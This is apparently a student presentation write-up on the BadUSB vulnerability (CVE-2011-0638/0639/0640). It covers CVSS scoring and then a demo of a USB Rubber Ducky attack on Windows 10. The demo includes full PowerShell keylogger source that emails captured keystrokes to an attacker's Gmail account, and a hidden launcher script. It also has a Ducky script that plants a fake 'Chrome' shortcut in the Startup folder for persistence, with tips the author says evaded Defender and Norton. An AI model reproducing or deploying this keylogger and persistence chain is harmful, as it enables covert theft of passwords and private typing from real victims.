# BadUSB
My presentation will be on [CVE-2011-0638](https://nvd.nist.gov/vuln/detail/CVE-2011-0638), [CVE-2011-0639](https://nvd.nist.gov/vuln/detail/CVE-2011-0639) and [CVE-2011-0640](https://nvd.nist.gov/vuln/detail/CVE-2011-0640) which are all the same vulnerability but one is for windows, one is for Mac OS X and one is for Linux. This vulnerability is quite simple, when you connect a USB human interface device (HID) to a computer such as a keyboard/mouse your computer will automatically install the drivers and allow you to use it. This is called trust by default, and it is what almost all computers do for components that take input from a human. The problem here is an attacker could create a USB device that emulates a keyboard or mouse which when plugged in could type extremely fast and execute an arbitrary program. It could type much faster than any human could and could do things like open a CMD and download malware from the internet or basically anything else you can do with a keyboard on your computer. Which by the way is anything, you actually don’t need a mouse its just convenient for a human operator. 

## CVSS Version 2.0 Scores
The vulnerability was discovered in 2011 and to my knowledge has not been patched to this day. Which I think is crazy considering all it would take is an option to require your password or something when entering a new USB device. The vulnerability got a base score of 6.9/10, an impact sub score of 10/10 and an exploitability sub score of 3.4/10.

### Impact Sub Score
The reason for such a high impact score is the vulnerability impacts confidentiality, integrity, and availability completely. Confidentiality is completely broken because a keyboard, which is your main HID to a computer has access to all the system data since the computer by default trusts that it is a human operator using it. The integrity of the system is also completely compromised as the attacker could do things like shut down your virus protection or install backdoors within seconds of the BadUSB being plugged in. [Here](https://samy.pl/usbdriveby/) you can see an example of a BadUSB attack against Mac OS X that will install a permanent backdoor, disable the firewall, and control the flow of network traffic. The worst part is all this happens within a few seconds and is totally permanent even after the USB has been removed. This attack could even do things like completely destroying a locked or unlocked system making it completely unavailable. An example of this attack is called [USB Killer](https://www.bleepingcomputer.com/news/security/shocking-usb-killer-uses-electrical-charge-to-fry-vulnerable-devices/). In this attack a specially crafted USB is plugged in and it collects power from USB power lanes (5V, 1-3A) until it is all the way charged up (240V). Then it discharges this stored voltage very quickly in an attempt to fry the computers circuitry. It continues this charge/discharge cycle until it or the computers circuitry are damaged or completely destroyed. What’s worse is the researchers that discovered this noted that it effected 95% of devices with the only device that withstood it being a new MacBook since it isolated the data lanes in the USB port.

### Exploitability Sub Score
The exploitability sub score was lower at only 3.4/10 and this is mainly due to the fact that the access vector is local meaning you need physical access to the device (to plug in the USB). The access complexity was medium, and I would attribute this to the fact that you do need to know some stuff about your target system first before deploying the attack. Things you would need to know would be the operating system since different operating systems have different keys for different things such as windows having the windows key. Also, different operating systems require different sequences of keystrokes to access different areas of the computer such as windows key + r opens the run dialog on windows systems but wouldn’t do that on Linux of Mac OS X. Finally, the exploit requires no authentication to work, and this is why it is so devastating. The trust by default characteristic employed by computers on HID devices is the vulnerability that this attack exploits making it require no authentication. However, I would like to note that the most devastating attacks (except USB Killer) do require the device to be unlocked although several still do not. So, I would say that while the exploit, being that computers just trust the USB by default requires no authentication but, many of the attacks that can be built on top of this vulnerability do require the device to be unlocked.

## BadUSB Windows Keylogger
For the demo portion of this presentation, I will be showing how this vulnerability can be used to deliver a simple but devastating keylogger to a fully up to date Windows 10 system. This attack does require the computer to be unlocked but just think of someone getting up to use the bathroom or to get a coffee and leaving their computer open on their desk, this attack only takes about 10 seconds from start to finish. This attack is also persistent and will continue to function after the USB is removed and even after the restart of the computer. I won’t be demoing the persistence because I’m not sure how to record a restarting computer but just take my word for it that it works.

Before I get into it I would just like to [CosmodiumCS](https://github.com/CosmodiumCS) he is the guy who actually wrote the keylogger code and his [YouTube channel](https://www.youtube.com/cosmodiumcs) has a ton of cool stuff I would definitely recommend checking it out. Also [here](https://www.youtube.com/watch?v=uHIZZYFeVJA) is his tutorial I followed for the windows keylogger. I however did modify his attack slightly to make it a bit less detectable (more on that later). 

### Attack overview
To create this attack there are a few steps and parts needed.
1. You need a USB rubber ducky
2. Flash that rubber ducky with the twin duck firmware
3. Get the code for the keylogger and add an email to it so the logged keystrokes can be sent there
4. Write the duckyscript that deploys the attack
5. Encode the duckyscript and put it and the keylogger payload on the USB rubber ducky
6. Plug in the USB rubber ducky to the victim system wait for it to complete in about 10 seconds then unplug the USB and watch the emails start to come in

### Hardware
For this attack I will be using a [USB rubber ducky](https://shop.hak5.org/products/usb-rubber-ducky-deluxe) which I purchased from the [Hak5 store](https://shop.hak5.org/) several years ago for about $50. I would highly recommend checking them out as they have some really cool hacking hardware on their site. This attack could also be carried out by another BadUSB configuration that is much cheaper, but this is just what I had on hand. [Here](https://medium.com/@EatonChips/building-a-usb-rubber-ducky-for-7-c851aae30a1d) is a really cool tutorial that shows you how to make a BadUSB out of a $7 Arduino USB microcontroller. I have not actually tried this yet so I can’t say if it works but i plan to try it in the future. 
<p align="center">
  <img src="https://github.com/svecile/BadUSB_Notes/blob/main/IMG_3324.jpg" alt="usbInners" width="100"/>
  <img src="https://github.com/svecile/BadUSB_Notes/blob/main/IMG_3325.jpg" alt="usb" width="150"/>
</p>
In the photo on the left you can see the inside of the USB which includes a programmable button for flashing the firmware/replaying attacks, a little LED to the right of that that blinks green and red to tell you different things, and then a 128 megabyte micro SD card for storing the attacks or data that you exfiltrated from the target system. The USB itself has a 60MHz 32-bit CPU and a JTAG interface with GPIO and DFU bootloader so you can really customize this thing in any way you want. In the photo on the right, you can see what it looks like with its cover on which is basically just one of those generic USBs that recruiters hand out. The generic nature of look of the USB is so drop attacks can be performed. This is a type of attack where you load the program onto the USB then just drop it somewhere and wait for someone to pick it up and plug it into their system. That’s why you should NEVER plug in random USBs to a non-sandboxed system. 
If your interested there are a bunch of different attacks for the USB rubber ducky that are ready to go on [hak5's github](https://github.com/hak5/usbrubberducky-payloads).

#### Ducky Firmware
For this attack I had to flash the rubber ducky with the twin duck firmware. Which is basically just a configuration where the rubber ducky not only emulates a keyboard but also USB mass storage so it can contain some files that are needed as part of the payload. The other way to do this without flashing the firmware (which is dangerous and can cause you to brick the USB) would just be to run a webserver and have the emulated keyboard type in a command to download the files from that server. [Here](https://github.com/hak5darren/USB-Rubber-Ducky) is a link that they don't advertise on their website but has all the things you need to flash the firmware and encode your payloads. [Here](https://www.youtube.com/watch?v=BzYH-BPHLpE) is also a YouTube tutorial on how to flash the USB with the twin duck firmware or any of the other [firmware](https://github.com/hak5darren/USB-Rubber-Ducky/tree/master/Firmware/Images) they have available.

### Keylogger
The basic keylogger consists of three files l.ps1, p.ps1 and c.cmd. p.ps1 is a PowerShell file and it is the main part of this attack as its the part that creates and writes to the log file that keeps track of keystrokes and sends them to the email you provided. l.ps1 is another PowerShell script but its job is to make sure that the log file (that logs the keystrokes) doesn't grow too large (to avoid discovery), by sending the contents of the file to the email provided in p.ps1 every hour and then clearing the log. The p.ps1 file is really small only about 40 lines of code without comments and such. One thing to note is if you are using Gmail you will need to turn on less secure access which just allows code to login to your Gmail so I wouldn’t recommend using your actual email. [Here](https://devanswers.co/allow-less-secure-apps-access-gmail-account/) is instructions on how to enable less secure access. Below you can see p.ps1 and I will explain its different parts in the presentation.

```
# gmail credentials
$email = "example@gmail.com"
$password = "password"

# keylogger
function KeyLogger($logFile="$env:temp/$env:UserName.log") {

  # email process
  $logs = Get-Content "$logFile"
  $subject = "$env:UserName logs"
  $smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", "587");
  $smtp.EnableSSL = $true
  $smtp.Credentials = New-Object System.Net.NetworkCredential($email, $password);
  $smtp.Send($email, $email, $subject, $logs);

  # generate log file
  $generateLog = New-Item -Path $logFile -ItemType File -Force

  # API signatures
  $APIsignatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

 # set up API
 $API = Add-Type -MemberDefinition $APIsignatures -Name 'Win32' -Namespace API -PassThru

  # attempt to log keystrokes
  try {
    while ($true) {
      Start-Sleep -Milliseconds 40

      for ($ascii = 9; $ascii -le 254; $ascii++) {

        # use API to get key state
        $keystate = $API::GetAsyncKeyState($ascii)

        # use API to detect keystroke
        if ($keystate -eq -32767) {
          $null = [console]::CapsLock

          # map virtual key
          $mapKey = $API::MapVirtualKey($ascii, 3)

          # create a stringbuilder
          $keyboardState = New-Object Byte[] 256
          $hideKeyboardState = $API::GetKeyboardState($keyboardState)
          $loggedchar = New-Object -TypeName System.Text.StringBuilder

          # translate virtual key
          if ($API::ToUnicode($ascii, $mapKey, $keyboardState, $loggedchar, $loggedchar.Capacity, 0)) {
            # add logged key to file
            [System.IO.File]::AppendAllText($logFile, $loggedchar, [System.Text.Encoding]::Unicode)
          }
        }
      }
    }
  }

  # send logs if code fails
  finally {
    # send email
    $smtp.Send($email, $email, $subject, $logs);
  }
}
# run keylogger
KeyLogger
```

Finally, c.cmd is the last part of the attack and is what allows it to be persistent. The code for c.cmd is below.
```
@echo off
powershell Start-Process powershell.exe -windowstyle hidden "$env:temp/p.ps1"
powershell Start-Process powershell.exe -windowstyle hidden "$env:temp/l.ps1"
```
Here @echo off just means when the CMD is opened you won’t see the PowerShell commands actually typed although they will still happen. The two commands just start each of the files in succession first p.ps1 (keylogger) and then l.ps1 (keylogger schedule). In the original attack by CosmodiumCS the c.cmd file is placed in the windows start folder so every time windows starts it will run which will in turn run the keylogger and the scheduler allowing this attack to be persistent. Just to note I am dumbfounded that Windows allows ANYTHING to be placed in this folder without admin privileges. Which is just a huge security risk. However, if you look at your Startup applications in task manager you will see it listed which I think makes it pretty obvious c.cmd shouldn’t be there.

<p align="center">
  <img src="https://github.com/svecile/BadUSB_Notes/blob/main/startup.png" alt="startup" width="600"/>
</p>

So, because of that I tried modifying this attack in two ways. The first way was just making the c.cmd file hidden which works well since it no longer shows up in the start programs of task manager. However, if you have show hidden files turned on like I do you can still see it kind of greyed out in the Startup folder so I thought I would disguise it in a cooler way which I will explain in the next part about the ducky script. 

### Ducky Script
Ducky script is a very simple language that has been developed specifically for the USB rubber ducky and is how you tell the USB what you want it to type. This script is just written in a simple text file and then is encoded by the ducky encoder into something the USB can read. The ducky encoder can be downloaded [here](https://downloads.hak5.org/api/devices/usbrubberducky/tools/jsencoder/1.0) and this will give you a file called "inject.bin" which is what you would copy to your USB rubber ducky. [Here](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Duckyscript) you can find a cheat sheet on the ducky script syntax but ill give a quick overview of the most important parts before i show you the script for the windows keylogger attack. 
- REM is the command you put in front of comments
- DELAY is the command you use to pause the program, which is important while you wait for things to load since this USB types extremely fast. Also, the numbers after delay are in milliseconds so 1000ms = 1sec
- GUI is the command that tells it to hold the windows key
- STRING is the command that tells it to type whatever comes after the command
- ENTER is the command to press the enter key

Those are the only 5 commands we need to write our payload for the USB rubber ducky. 
```
REM STAGE1
REM open runbox
DELAY 5000
GUI r
DELAY 200
STRING powershell
ENTER
DELAY 300

REM STAGE 2
REM move files to appropriate directories
STRING $u=gwmi Win32_Volume|?{$_.Label -eq'L'}|select name;cd $u.name;cp .\p.ps1 $env:temp;cp .\l.ps1 $env:temp;cp .\c.cmd $env:temp;cp .\ChromeIcon.ico $env:temp;$WScriptObj = New-Object -ComObject ("WScript.Shell");$shortcut = $WscriptObj.CreateShortcut("C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Chrome.lnk");$shortcut.TargetPath = "$env:temp\c.cmd";$Shortcut.IconLocation = "$env:temp\ChromeIcon.ico, 0";$shortcut.Save();cd $env:temp;echo "">"$env:UserName.log";
ENTER
DELAY 200

REM STAGE 3 run keylogger
STRING cd "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";.\Chrome.lnk;exit
ENTER
```
This script works as follows:
Stage 1 
1. You can first see it delay 5 seconds this is so the computer has time to install the keyboard drivers
2. It then presses GUI (windows key) + r to open the run dialog 
3. It waits 200ms for the run box to open
3. It types the string "powershell" and presses enter to open a PowerShell terminal (non-admin)
    - I did find a way to open PowerShell as an admin to do more damage to the system like disabling windows defender and stuff but its not needed for the basic keylogger so I’m going to keep it simple for this demo. 
4. It then delays 200ms to wait for the PowerShell window to open before it starts typing

Stage 2

This is where you see the speed typing prowess of the USB rubber ducky as it types out an entire PowerShell program in a second. The program moves the files p.ps1, l.ps1 and c.cmd to where they need to go, and it does this by typing that big string into the PowerShell terminal which is basically just a PowerShell program squished into one string. Here is where I modified the attack. Originally the script would copy c.cmd into the start folder and l.ps1 and p.ps1 into the temp folder but that lead to the c.cmd being visible in the Startup section of task manager. Instead, I made all three files hidden and moved them into the temp folder. I then use PowerShell to create a hidden shortcut to c.cmd, named it chrome and gave it the chrome icon. I placed this shortcut in the Startup folder so now if you have viewing hidden files on it looks just like google chrome is in the Startup folder. This is not uncommon, and I don’t think a user would think twice about this. The fact that the shortcut is hidden also means that nothing shows up in task manager's Startup items. Another bonus is now that I am using a shortcut to launch the CMD I can specify that the window should be started in minimized mode. So, when the script runs at Startup a CMD window won’t pop up momentarily, instead you’ll just see a flash of the CMD icon on the task bar which is almost unnoticeable. These steps just further allow our attack to avoid detection. Below you can see the PowerShell string in readable code format with comments so it's easier to understand.

```
# this line just selects the USB device's name which is "L"
$u=gwmi Win32_Volume|?{$_.Label -eq'L'}|select name;

# this changes us into the USB's directory
cd $u.name;

# this copies p.ps1, l.ps1, c.cmd and the chrome icon file into the windows temp folder (could have been any folder but this is just easy)
cp .\p.ps1 $env:temp;
cp .\l.ps1 $env:temp;
cp .\c.cmd $env:temp;
cp .\ChromeIcon.ico $env:temp;

# this creates a new shortcut called "Chrome"
$WScriptObj = New-Object -ComObject ("WScript.Shell");
$shortcut = $WscriptObj.CreateShortcut("C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/StartMenu/Programs/Startup/Chrome.lnk");

# this sets the newly created shortcut to point to c.cmd
$shortcut.TargetPath = "$env:temp\c.cmd";

# this sets the icon of the shortcut to the chrome logo to help it hide in plain sight
$Shortcut.IconLocation = "$env:temp\ChromeIcon.ico, 0";

# this saves the shortcut
$shortcut.Save();

# this changes into the temp folder and creates the log file that will log the users keystrokes
cd $env:temp;
echo "">"$env:UserName.log";
```

Stage 3

This stage just changed into the Startup folder and runs the shortcut to c.cmd starting the keylogger. It then exits and cleans up and at this point you can remove the USB and the attack is finished. You should see an email in the inbox of the email you put into p.ps1 indicating that it is running properly.

### Final Comments
I was absolutely astonished by how well this attack works not only did windows defender not detect it, but I also ran the same attack on my main computer and Norton 360 didn’t detect it either! Norton is supposed to be the best, but it didn’t detect a thing even after a system scan. The only thing that I would maybe improve about the keylogger with time would be that when it logs the keystrokes it doesn’t log things such as the delete key being pressed so if someone makes a mistake while typing you can’t see where they corrected it.

## Additional Resources
- [Here](https://www.bleepingcomputer.com/news/security/heres-a-list-of-29-different-types-of-usb-attacks/) is a list of 29 different attacks that can be performed by BadUSB's but there are many more

